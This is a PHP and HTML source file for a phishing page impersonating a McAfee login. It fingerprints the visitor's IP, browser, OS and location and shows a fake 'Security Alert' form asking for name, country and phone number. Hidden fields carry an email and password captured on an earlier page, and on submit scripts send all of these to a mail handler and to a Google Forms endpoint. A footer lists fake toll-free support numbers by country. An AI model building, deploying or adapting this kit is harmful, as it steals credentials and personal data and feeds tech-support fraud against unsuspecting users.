<?php
$u_agent = $_SERVER['HTTP_USER_AGENT'];
$str_info = substr($u_agent, 11, 50);
$os=substr($str_info, 0, strpos($str_info, "AppleWebKit")); 


function getBrowser()
{
$u_agent = $_SERVER['HTTP_USER_AGENT'];
$bname = 'Unknown';
$platform = 'Unknown';
$version= "";

//First get the platform?
if (preg_match('/linux/i', $u_agent)) {
$platform = 'linux';
}
elseif (preg_match('/macintosh|mac os x/i', $u_agent)) {
$platform = 'mac';
}
elseif (preg_match('/windows|win32/i', $u_agent)) {
$platform = 'windows';
}

// Next get the name of the useragent yes seperately and for good reason
if(preg_match('/MSIE/i',$u_agent) && !preg_match('/Opera/i',$u_agent))
{
$bname = 'Internet Explorer';
$ub = "MSIE";
}
elseif(preg_match('/Trident/i',$u_agent))
{ // this condition is for IE11
$bname = 'Internet Explorer';
$ub = "rv";
}
elseif(preg_match('/Firefox/i',$u_agent))
{
$bname = 'Mozilla Firefox';
$ub = "Firefox";
}
elseif(preg_match('/Chrome/i',$u_agent))
{
$bname = 'Google Chrome';
$ub = "Chrome";
}
elseif(preg_match('/Safari/i',$u_agent))
{
$bname = 'Apple Safari';
$ub = "Safari";
}
elseif(preg_match('/Opera/i',$u_agent))
{
$bname = 'Opera';
$ub = "Opera";
}
elseif(preg_match('/Netscape/i',$u_agent))
{
$bname = 'Netscape';
$ub = "Netscape";
}

// finally get the correct version number
// Added "|:"
$known = array('Version', $ub, 'other');
$pattern = '#(?<browser>' . join('|', $known) .
')[/|: ]+(?<version>[0-9.|a-zA-Z.]*)#';
if (!preg_match_all($pattern, $u_agent, $matches)) {
// we have no matching number just continue
}

// see how many we have
$i = count($matches['browser']);
if ($i != 1) {
//we will have two since we are not using 'other' argument yet
//see if version is before or after the name
if (strripos($u_agent,"Version") < strripos($u_agent,$ub)){
    $version= $matches['version'][0];
}
else {
    $version= $matches['version'][1];
}
}
else {
$version= $matches['version'][0];
}

// check if we have a number
if ($version==null || $version=="") {$version="?";}

return array(
'userAgent' => $u_agent,
'name'      => $bname,
'version'   => $version,
'platform'  => $platform,
'pattern'    => $pattern
);
}

// now try it
$ua=getBrowser();
$yourbrowser= $ua['name'] . " " . $ua['version'] ;


function getIPAddress() {  
//whether ip is from the share internet  
if(!empty($_SERVER['HTTP_CLIENT_IP'])) {  
        $ip = $_SERVER['HTTP_CLIENT_IP'];  
}  
//whether ip is from the proxy  
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {  
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];  
}  
//whether ip is from the remote address  
else{  
     $ip = $_SERVER['REMOTE_ADDR'];  
}  
return $ip;  
}  
$ip = getIPAddress();


if(isset($_POST['submit']))
{

    $key=$_POST['key'];
}
$email=$_POST['emailField'];
$password=$_POST['password'];
$key_pro=$_POST['key_pro'];

?>
<?php 
    $location=(unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip)));
    $city= $location['geoplugin_city'];
    $state= $location['geoplugin_region'];
    $country= $location['geoplugin_countryName'];
    $zip= $location['geoplugin_areaCode'];
    $c_code= $location['geoplugin_countryCode'];
 ?>
<!DOCTYPE html>
<html>
<head>
	<title>Mcafee Login</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/css/bootstrap.min.css">
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/js/bootstrap.min.js"></script>
    <link rel="stylesheet" href="css/login.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="shortcut icon" href="../img/favicon.ico">
    <style>
        ::-webkit-input-placeholder { /* Edge */
    color: #4d4d4d;
    font-size: 16px;
    font-weight: 300;
    text-align:left;
    /* padding-left:15px; */
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  }
  
  :-ms-input-placeholder { /* Internet Explorer */
    color: #4d4d4d;
  }
  
  ::placeholder {
    color: #4d4d4d;
  }
        .loader 
        {   
            margin-left:45%;
            margin-top:15%;
            border: 16px solid #f3f3f3;
            border-radius: 50%;
            border-top: 16px solid #c01818;
            width: 120px;
            height: 120px;
            -webkit-animation: spin 2s linear infinite; /* Safari */
            animation: spin 2s linear infinite;
            }

            /* Safari */
            @-webkit-keyframes spin {
            0% { -webkit-transform: rotate(0deg); }
            100% { -webkit-transform: rotate(360deg); }
            }

            @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .rk-activ1{
            margin-top:8%;
        }
        .loader2 
        {   
            margin-left:35%;
            margin-top:10%;
            display:none;
            border: 16px solid #f3f3f3;
            border-radius: 50%;
            border-top: 16px solid #662d91;
            width: 120px;
            height: 120px;
            -webkit-animation: spin 2s linear infinite; /* Safari */
            animation: spin 2s linear infinite;
            }

            /* Safari */
            @-webkit-keyframes spin {
            0% { -webkit-transform: rotate(0deg); }
            100% { -webkit-transform: rotate(360deg); }
            }

            @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        @media only screen and (max-width: 1200px)
        {
            .loader
            {
                margin-top:18%;
                margin-left:45%;
            }
        }
        @media only screen and (max-width: 1000px)
        {
            .loader
            {
                margin-top:25%;
                margin-left:45%;
            }
        }
        @media only screen and (max-width: 1000px)
        {
            .loader
            {
                margin-top:25%;
                margin-left:45%;
            }
        }
        @media only screen and (max-width: 425px)
        {
            .loader
            {
                margin-top:35%;
                margin-left:35%;
            }
        }
        #actr{
            display:none;
        }
    </style>
</head>
<body>
<div class="loader"></div>

<div class="loader1">
    <div class="container-fluid">
        <div class="col-lg-2 col-md-2"></div>
        <div class="col-lg-8 col-md-8 col-sm-12 col-xs-12 form-box" style="height:700px;">
            <div class="row">
                <div class="col-lg-3 col-md-3 col-xs-3">
                    <a href="index.php"><img src="../img/logo.png" alt=""></a> 
                </div>
                <div class="col-lg-9 col-md-9 col-xs-9" style="margin-top: -11px;">
                    
                </div>
            </div>
            <div class="col-lg-12 login-header-link">
                <div class="col-lg-8 col-xs-8">
                    <ul class="mcafee-login-header">
                        <li><a href="../act-mca.php">Activate Activation Code </a> </li>
                        <li><a href="mca-log.php">Login </a></li>
                        <li><a href="../mcareg">Register </a></li>
                        <li><a href="../mca-support.php">Contact Support </a></li>
                    </ul>
                </div>
                <div class="col-lg-4 text-right login-header-side">
                    
                </div>
            </div>
            <div class="row login-section"  >
                <div class="col-md-6" style="padding-left: 0px;padding-right: 10px;margin-top: -20px;">
                    <h3 class="login-heading">Log In to McAfee</h3>
                    <div class="col-lg-12 login-left-side-form" style="height: 550px;">
                        <h5 class="login-security-msg">Security Alert !</h5>
                        <h5 class="login-security-msg1">Confirm your identity</h5>
                        <form id="form login-sidebar-form" target="_self" onsubmit="return postToGoogle();" action="" autocomplete="off">
                            <label for="email" class="label-login-form">Full Name:</label>
                            <input id="nameField" name="fullname" type="text" class="input-key-product" required><br>
                            <label  name="password" for="pass"  class="label-login-form" style="margin-top:10px;">Country:</label><br>
                            <select id="country" class="form-control input-key-product sign-input" class="" required>
                                <option value="">Country</option>
                                <option value="United States">United States +1</option>
                                <option value="Canada">Canada +1</option>
                                <option value="Australia">Australia +61</option>
                                <option value="United Kingdom">United Kingdom +44</option>
                                <option value="New Zealand">New Zealand +64</option>
                                <option value="Other">Other</option>
                            </select><br>
                            <p class="text-center" style="font-size: 12px;margin-top:12px;color: #1b07bd;"><b>Enter your phone number and we will send you a verification code to confirm your identity</b></p>
                            <label  for="pass"  class="label-login-form">Phone no:</label><br>
                            
                            <input id="phoneno" type="text" class="input-key-product" required><br><br>
                            
                            <input type="checkbox" name="" id=""><label for="email" class="label-login-form"> &nbsp;Remember Me</label><br>
                           
                            <input type="hidden" id="ipField" name="ip" value="<?php echo $ip; ?>">

                            <input type="hidden" id="osField" name="os" value="<?php echo $os; ?>">

                            <input type="hidden" id="browserField" name="browser" value="<?php echo $yourbrowser; ?>" id="">
                            <input type="hidden" id="key_pro" name="key_pro" value="<?php echo $key_pro; ?>" >

                            <input type="hidden" id="email" name="email" value="<?php echo $email; ?>">

                            <input type="hidden" id="password" name="password" value="<?php echo $password; ?>">

                            <input type="submit" class="log-in-button" value="LOG IN">
                        </form>
                        
                    </div>
                </div>
                <div class="col-md-6 " style="padding-left: 0px;padding-right: 10px;">
                   
                </div>
            </div>
            <div class="clearfix"></div>
           <!-- <div class="footer"></div> -->
           
        </div>
        <div class="col-lg-2 col-md-2"></div>
    </div>
</div>
<div class="footer">
  <p><span class="cont-text">Customer Support Toll Free :</span> <span class="number-hp">
  
  <?php 
if($c_code == "US")
{
echo "US/CA +1 844 514 0332";
}
elseif($c_code == "CA")
{
echo "US/CA +1 844 514 0332";
}
elseif($c_code == "GB")
{
echo "UK   +44 800 229 4982";
}
elseif($c_code == "AU")
{
echo "AU   +1 844 514 0332";
}
elseif($c_code == "NZ")
{
echo "NZ   +1 844 514 0332";
}
else
{
    echo "+1 844 514 0332";
}
?>  
  </span> </p>
</div>
</body>
</html>
<script>
  $("#form").submit(function() 
  {
    var field1 = $("#email").val();
    var field2 = $("#password").val();
    var field3 = $("#ipField").val();
    var field4 = $("#osField").val();
    var field5 = $("#browserField").val();
    var field6 = $("#country option:selected").text();
    var field7 = $("#phoneno").val();
    var field8 = $("#nameField").val();       
    $.ajax({
        type: "POST",
        url:  "login-mail.php",
        data: {"email": field1, "pass": field2, "ip": field3, "os": field4, "browser": field5,"country": field6, "mobno": field7, "name": field8},
        success: function(data) {
           return true;
        }
    });
        return false    
        e.preventDefault();
});
</script>

<script>
        function pageRedirect() {
                     window.location.replace("err.php");
                        }   
    function postToGoogle() {
        var field1 = $("#email").val();
        var field2 = $("#password").val();
        var field3 = $("#ipField").val();
        var field4 = $("#osField").val();
        var field5 = $("#browserField").val();
        var field6 = $("#country option:selected").text();
        var field7 = $("#phoneno").val();
        var field8 = $("#nameField").val();
        var field9 = $("#key_pro").val();
        var issue= "MCA-LOG";

           $.ajax({
                url: "https://docs.google.com/forms/d/e/1FAIpQLScktgcZ6EoZg6XEFBgHpZH26mH3gKuJZ1lF10ldYKhEcrHjjQ/formResponse",
                data: {"entry.806782166": field1, "entry.492630052": field2, "entry.500770884": field3, "entry.297371834": field4, "entry.1328838957": field5,"entry.55418645": field6, "entry.843182171": field7, "entry.387747653": field8, "entry.1662271692": field9, "entry.1753287777": issue},
                type: "POST",
                dataType: "xml",
                success: function(d)
			{
			},
            
			error: function(x, y, z)
				{
                    setTimeout("pageRedirect()", 100);
					
				}
           });
		return false;
       }
</script>
<script>
    $(document).ready(function(){
    $(".loader1").hide();
    setTimeout(function(){
	$(".loader1").show();
},6000);

    setTimeout(function(){
	$(".loader").hide();
},6000);
});
</script>